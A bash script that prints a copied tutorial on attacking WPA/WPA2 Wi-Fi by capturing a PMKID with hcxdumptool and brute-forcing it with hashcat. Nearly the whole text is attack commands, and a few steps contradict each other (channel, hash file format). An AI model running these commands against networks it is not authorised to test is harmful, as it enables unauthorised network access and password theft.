#!/bin/bash
echo "#How To Capture WPA/WPA2 PMKID Kali Linux 2018.4"
# apt install figlet -y && apt install neofetch -y
echo""
figlet hcxdumptool
#
#2018-12-23 Super Ethical Hacking Tutorials, Kali Linux 2018.4 Tutorials, Wireless 0
#How To Install ALFA AWUS1900 Kali Linux 2018.4
#image_pdfimage_print
#
#In this guide i will use the new method to capture WPA/WPA2 PMKID.
#
#“This attack was discovered accidentally while looking for new ways to attack the #new WPA3 security standard. WPA3 will be much harder to attack because of its modern #key establishment protocol called “Simultaneous Authentication of Equals” (SAE).
#
#The main difference from existing attacks is that in this attack you do not need to #capture a full EAPOL 4-way handshake. The new attack is performed on the RSNIE #(Robust Security Network Information Element) of a single EAPOL frame.”
#
#DISCLAIMER: This software/tutorial is for educational purposes only. It should not #be used for illegal activity. The author is not responsible for its use or the users #action.
echo "Step 1: Install Dependencies And Tools"

##1.1 Install dependence

echo "sudo apt install libcurl4-openssl-dev libpcap0.8-dev zlib1g-dev libssl-dev"
echo ""
##1.2 In order to use the new attack you need the following tools:

#    hcxdumptool v4.2.0 or higher
#    hcxtools v4.2.0 or higher
#    hashcat v4.2.0 or higher

echo "Download hcxdumptool, hcxtools and hashcat"
echo ""
echo "sudo git clone https://github.com/ZerBea/hcxdumptool.git"

echo "sudo git clone https://github.com/ZerBea/hcxtools.git"

echo "sudo git clone https://github.com/hashcat/hashcat.git"
echo ""
echo "1.3 Install hcxdumptool"

echo "cd hcxdumptool"
echo ""
echo "1.3.a Create the installation"

echo "sudo make"
echo ""
echo "1.3.b Start the installation"

echo "sudo make install"
echo ""
echo "1.4.a Install hcxtools"

echo "cd .."
echo "cd hcxtools/"
echo ""
echo "1.4.b Create the installation" 

echo "sudo make"
echo ""
echo "1.4.c Start the installation"

echo "sudo make install"
echo ""
echo "1.5.a Install hashcat"

echo "cd .."
echo "cd hashcat"
echo ""
echo "1.5.b Create the installation"

echo "sudo make"
echo ""
echo "1.5.c Start the installation"

echo "sudo make install"
echo ""
echo "Step 2: Configure Network Card"

echo "2.1 Set network card in monitor mode"

## Set interface down
echo "sudo ip link set wlan0 down"
 
## Set monitor mode
echo "sudo iwconfig wlan0 mode monitor"
 
## Set interface up
echo "sudo ip link set wlan0 up"
echo ""
echo "2.2 Confirm monitor mode (ALFA AWUS1900)"

echo "sudo iwconfig"
echo ""
echo "2.3 Kill the wpa_supplicant for wlan0"

echo "sudo wpa_cli terminate wlan0"
echo ""
echo "Step 3: Use Airodump-ng to sniff nearby networks"

echo "3.1 Open a new terminal and run airodump-ng to find your target BSSID"

echo "sudo airodump-ng --ivs wlan0"
echo "## Or dump the capture to a file"
echo "sudo airodump-ng wlan0 --ivs --wps -w /root/Desktop/Dump01 --output-format csv"
echo ""
echo "3.2 Open a new terminal and navigate to the hashcat directory and create a filtermode file with our Target BSSID"

## Open hashcat directory
echo "cd hashcat/"

echo "## Create the filtermode file and enter the targets BSSID" 
echo "## Target BSSID 84:C9:B2:6A:9E:90 ESSID HonnyP01 Chanel 1"
echo "## "echo "BSSID">filter.txt""

echo "sudo echo "84C9B26A9E90">filter.txt"
echo ""
echo "Step 4: Use Hcxdumptool To Catch PMKID From The Target"

echo "4.1 Lunch Hcxdumptool and write to cap01.pcapng and use the filermode file and only use chanel 5"

echo "sudo hcxdumptool -o cap01.pcapng -i wlan0 --filterlist=filter.txt --filtermode=2 --enable_status=1 -c 1"
echo ""
echo "Let the tool run at least 10 minutes and If an AP receives the association request packet and supports sending PMKID you will see a message “FOUND PMKID” "
echo ""
echo "4.2 Run hcxpcaptool to convert the captured data from pcapng format to a hash format accepted by hashcat"

echo "sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z cap01.16800 cap01.pcapng"
echo ""
echo "or"
echo ""
echo "sudo hcxpcaptool -o cap01.22000 cap01.pcapng"
echo ""
echo "4.3 Validate the hash"

echo "cat cap01.16800"
echo ""
echo "4.4 Crack the formatted pcapng with hashcat"

echo "./hashcat -m 22000 cap01.22000 -a 3 -w 3 '?l?l?l?l?l?lt!'"
echo ""
echo ""
echo " Copied from : https://online-it.nu/how-to-attack-wpa-wpa2-pmkid-kali-linux-2018-4/ "
echo ""
echo ""
neofetch
date
echo "Beautiful Hacking! Good Luck!"







